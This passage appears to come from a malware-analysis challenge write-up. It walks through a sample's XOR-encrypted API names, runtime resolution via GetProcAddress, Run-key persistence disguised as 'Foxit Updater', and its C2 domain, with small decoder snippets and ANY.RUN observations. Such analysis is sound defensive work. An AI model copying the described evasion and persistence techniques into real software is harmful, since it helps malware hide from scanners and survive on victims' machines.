There's no ADVAPI32 and no WS2_32 or WinHTTP, yet the code clearly uses registry and network functions: their names sit as strings in the data section (<code style="color:chartreuse;">RegCreateKeyExW</code>, <code style="color:chartreuse;">RegSetValueExW</code>, <code style="color:chartreuse;">WSAStartup</code>, <code style="color:chartreuse;">gethostbyname</code>), and others are stored encrypted. Those functions have to be found at runtime.
</p>
<p>
Among the 66 KERNEL32 imports are two that make that possible: <code style="color:chartreuse;">LoadLibraryA</code> and <code style="color:chartreuse;">GetProcAddress</code>.
</p>
 
<img src="/assets/writeup/solve15.png" alt="Figure 18: The Imports tab of stage3.bin in IDA, filtered on GetProcAddress" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 18: The Imports tab of stage3.bin in IDA, filtered on GetProcAddress. The import sits in KERNEL32 at 0x10033000.</em></p>
 
<p>
The way these two work together is standard. <code style="color:chartreuse;">LoadLibraryA</code> loads a DLL by name, and <code style="color:chartreuse;">GetProcAddress</code> takes a function name and returns its address. A program can then call that address through a function pointer, and nothing in the import table says which function it is. The malware goes one step further and hides the names themselves. Strings in the data section are stored XOR-encrypted and decrypted by short loops right before use. The pseudocode shows two forms:
</p>
 
```c
v43[i] ^= (unsigned __int8)(i - 98) ^ 0x9E;           // ANSI strings
Src[j] ^= (unsigned __int16)(j - 27234) ^ 0x959E;     // Unicode strings
```
 
<p>
Decrypting a few of the ANSI strings with that formula shows what they hide:
</p>
 
| Stored form | Decrypted |
| --- | --- |
| `WhPwHIJtH\X` | `WinHttpOpen` |
| `WhPwHIJxWWXRWA` | `WinHttpConnect` |
| `Cs^HXnSJ\WS` | `CreateThread` |
| `VhLKI\VzTUYT` | `VirtualAlloc` |
 
<p>
So the pattern is: decrypt a name, pass it to a resolver, store the returned address, and call through it. Antivirus scanning the file for suspicious API names finds none, and the import table looks innocent.
</p>
 
<h3 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'">Question 15: Which Windows API is used by the malware to dynamically resolve additional API functions?</h3>
 
```
ANSWER: GetProcAddress
```
 
<hr>
 
<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Staying alive</h2>
 
<p>
Persistence was the next thing to look for. The DLL imports nothing from the registry library, so I started where a registry path would have to appear: the strings. At first, IDA's Strings window gave me almost nothing useful, only two long runs of printable ASCII characters (Figure 19). That was misleading rather than informative: Windows registry paths are stored as UTF-16 (wide) strings, and IDA doesn't list those by default.
</p>
 
<img src="/assets/writeup/image_fig19.png" alt="Figure 19: The Strings window of stage3.bin before configuration" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 19: The Strings window of stage3.bin before configuration. Right-clicking in the list (1) and choosing Setup (2) opens the string settings.</em></p>
 
<p>
In the Setup dialog I enabled <b style="color:cornflowerblue;">Unicode C-style (16 bits)</b> next to the default C-style option, and I filtered the list on a backslash to keep only path-like strings (Figure 20). The list changed completely:
</p>
 
<img src="/assets/writeup/image_fig20.png" alt="Figure 20: With Unicode strings enabled, the list fills with paths" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 20: With Unicode strings enabled (1), the list fills with paths. The highlighted entry (2) is Software\Microsoft\Windows\CurrentVersion\Run, 0x5C bytes long.</em></p>
 
<p>
Beyond the highlighted entry, the list reads like a map of where the malware may place itself or look for files:
</p>
 
```
Software\CLASSES\ms-pu
Documents and Settings\All Users\Application Data
\ProgramData
%appdata%\Render\
temp%\
%userprofile%\
%s\%s
Software\Microsoft\Windows\CurrentVersion\Run
```
 
<p>
The entry I cared about is the last one, the classic autorun location. Its length column says <code style="color:chartreuse;">0x5C</code> bytes, which is exactly 45 characters plus the terminator in UTF-16, so it is a complete wide string and not a fragment. The <code style="color:chartreuse;">Software\CLASSES\ms-pu</code> entry is a different key; I noted it but did not treat it as the persistence entry, because the question asks about the key where something is created to survive a reboot, and I have no evidence it is used for that.
</p>
<p>
Then came the part that needed patience. Looking for the code that uses the <code style="color:chartreuse;">Run</code> path, IDA showed no cross-references: the pointers are computed at runtime instead of written directly into the instructions, which is part of the obfuscation in this sample. So I worked from the neighbors. The <code style="color:chartreuse;">.rdata</code> listing around that string places a literal named <code style="color:chartreuse;">Foxit Updater</code> right before it, next to the fragments used to build a quoted path:
</p>
 
```nasm
.rdata:10034BA4   's%s\%s'
.rdata:10034BB2   '"'
.rdata:10034BB4   '%s"'
.rdata:10034BBC   'Foxit Updater'
.rdata:10034BD8   'Software\Microsoft\Windows\CurrentVersion\Run'
```
 
<img src="/assets/writeup/image_fig21.png" alt="Figure 21: the .rdata listing around 0x10034BBC" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 21: the .rdata listing around 0x10034BBC, with 'Foxit Updater' and the Run path visible together.</em></p>
 
<p>
Compilers tend to place string literals roughly in the order the code first uses them, so literals that sit together are usually used together. That reads naturally: a path built with quotes (<code style="color:chartreuse;">"C:\...\file.exe"</code>), an entry named <code style="color:chartreuse;">Foxit Updater</code>, and the <code style="color:chartreuse;">Run</code> key where such an entry lives. The quote character at <code style="color:chartreuse;">0x10034BB2</code> does have a cross-reference, from <code style="color:chartreuse;">0x10021264</code>, where the code calls <code style="color:chartreuse;">wsprintfW</code> to build that path. A little further on, at <code style="color:chartreuse;">0x10022058</code>, a call passes <code style="color:chartreuse;">80000001h</code>, the predefined handle for <code style="color:chartreuse;">HKEY_CURRENT_USER</code>, to a function that turned out to be a wrapper around <code style="color:chartreuse;">RegCreateKeyExW</code>: it decrypts the function name from a 15-byte string with the sample's own XOR scheme, then calls it with write access.
</p>
 
<img src="/assets/writeup/image_fig22.png" alt="Figure 22: the call at 0x10022058 with push 80000001h" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 22: the call at 0x10022058 with push 80000001h.</em></p>
 
<h3 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'">Question 16: The malware ensures persistence by modifying the Windows Registry. Identify the full registry key path and the specific value name created.</h3>
 
```
ANSWER: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value name: Foxit Updater
```
 
<hr>
 
<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">Calling home</h2>
 
<p>
With persistence covered, the remaining question was how the malware talks to the outside. The import table gave nothing away: <code style="color:chartreuse;">stage3.bin</code> imports only KERNEL32 and USER32, with no WinHTTP, WinINet or Winsock library in sight. The data section did hold a plaintext table of Winsock names (<code style="color:chartreuse;">WSAStartup</code>, <code style="color:chartreuse;">WSAGetLastError</code>, <code style="color:chartreuse;">gethostbyname</code>, <code style="color:chartreuse;">inet_ntoa</code>, <code style="color:chartreuse;">WSACleanup</code>), but none of those establishes a connection. Winsock initialization and name resolution are prerequisites, not the connection itself, so the API I was after had to be hidden elsewhere.
</p>
<p>
It was. The pseudocode of the network thread, <code style="color:chartreuse;">sub_1000709C</code>, contains short loops that decrypt strings right before use, with the same XOR scheme the sample uses everywhere:
</p>
 
```c
#include <stdio.h>
#include <string.h>
 
int main() {
    char v43[15];
    int m;
 
    strcpy(v43, "WhPwHIJxWWXRWA"); // encrypted string stored in the binary
 
    for (m = 1; m != 14; ++m)
        v43[m] ^= (unsigned char)(m - 98) ^ 0x9E; // XOR decryption loop
 
    v43[14] = 0; // null terminator
 
    printf("%s\n", v43); // prints the decrypted API name
 
    return 0;
}
```
 
<img src="/assets/writeup/image_fig23.png" alt="Figure 23: The network thread" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 23: The network thread. A 14-byte encrypted string is decrypted in place, passed to the resolver <code>sub_10002B98</code>, and the returned address is called with four arguments.</em></p>
 
<p>
Applying the loop's formula to the stored string gives the name directly:
</p>
 
```python
s = "WhPwHIJxWWXRWA"
# apply the same XOR formula used by the malware's decryption loop
print("".join(chr(ord(c) ^ (((i - 98) & 0xFF) ^ 0x9E)) for i, c in enumerate(s)))
# output: WinHttpConnect
```
 
<img src="/assets/writeup/image_fig24.png" alt="Figure 24: Decrypting the stored string" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 24: Decrypting the stored string with the formula from the loop. The result is WinHttpConnect.</em></p>
 
<p>
The shape of the call confirms it. <code style="color:chartreuse;">WinHttpConnect</code> takes four arguments: a session handle, the server name, the port, and a reserved zero. The code above passes exactly that: <code style="color:chartreuse;">v14</code> (the session handle returned by the call just before, which decrypts to <code style="color:chartreuse;">WinHttpOpen</code> in the same way), <code style="color:chartreuse;">HIDWORD(v52)</code> (a pointer that I take to be the server name), the port read from the structure passed to the thread, and <code style="color:chartreuse;">0</code>. The sample also stores a table of further WinHTTP names (<code style="color:chartreuse;">WinHttpOpenRequest</code>, <code style="color:chartreuse;">WinHttpSendRequest</code>, <code style="color:chartreuse;">WinHttpReceiveResponse</code>, <code style="color:chartreuse;">WinHttpQueryHeaders</code> and others), which fits an HTTP client built on top of this connection.
</p>
 
<h3 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'">Question 17: Which Windows API does the malware use to establish a connection to the C2 server?</h3>
 
```
ANSWER: WinHttpConnect
```
 
<hr>
 
<h2 style="color:crimson; font-family: 'Press Start 2P', 'system-ui'">A little help from ANY.RUN</h2>
 
<p>
For this part, I decided to use <b style="color:cornflowerblue;">ANY.RUN</b> instead of running the sample in my own VM. My laptop is not exactly a monster, and running a Windows VM on it tends to make it work harder than it signed up for XD. The moment I start the VM, the poor thing starts fighting for its life, so I figured it was better to let ANY.RUN handle the dynamic analysis this time.
</p>
<p>
And honestly, it was the right call. I only needed to observe the DNS and network activity while <code style="color:chartreuse;">FoxitUpdater.exe</code> was running, and ANY.RUN made that much easier without turning my laptop into a space heater.
</p>
<p>
The analysis showed repeated DNS requests for:
</p>
 
```
autodealersflorida.com
```
 
<p>
The domain appeared multiple times in the <b style="color:cornflowerblue;">DNS Requests</b> tab while <code style="color:chartreuse;">FoxitUpdater.exe</code> was running (Figure 25). The screenshot shows several requests for <code style="color:chartreuse;">autodealersflorida.com</code>, with ANY.RUN reporting <b style="color:cornflowerblue;">"IP Addresses not found"</b> for the domain.
</p>
 
<img src="/assets/writeup/image_fig25.png" alt="Figure 25: ANY.RUN showing repeated DNS requests" style="display:block; margin:20px auto; border-radius:12px; max-width:80%;">
<p style="text-align:center; color:#888; font-size:17px;"><em>Figure 25: ANY.RUN showing repeated DNS requests for <code>autodealersflorida.com</code> during the execution of <code>FoxitUpdater.exe</code>.</em></p>
 
<p>
This gave me the missing piece from the previous static-analysis step. We already knew that Stage 3 uses <code style="color:chartreuse;">WinHttpConnect</code>, but the runtime network activity finally revealed the server name being queried by the malware.
</p>
 
<h3 style="color:#3ba2a6; font-family: 'Press Start 2P', 'system-ui'">Question 18: What is the C2 server used by the malware?</h3>
 
```
ANSWER: autodealersflorida.com
```
 
<p>
The domain is confirmed by the repeated DNS requests observed in ANY.RUN during the execution of <code style="color:chartreuse;">FoxitUpdater.exe</code>.
</p>
 
<hr>
 
<p>
Thanks a lot for taking the time to read this write-up. I hope it was helpful and easy to follow, and that you enjoyed following the journey of digging through the malware and tracking down its C2 server.
</p>
<p>
If I made any mistakes along the way, they're on me (or on Shaytan); any good or correct part of this write-up is purely from Allah.
</p>
 
<img src="/assets/writeup/exit.gif" alt="exit" style="display:block; margin:20px auto; border-radius:12px; max-width:60%;">
 

</div>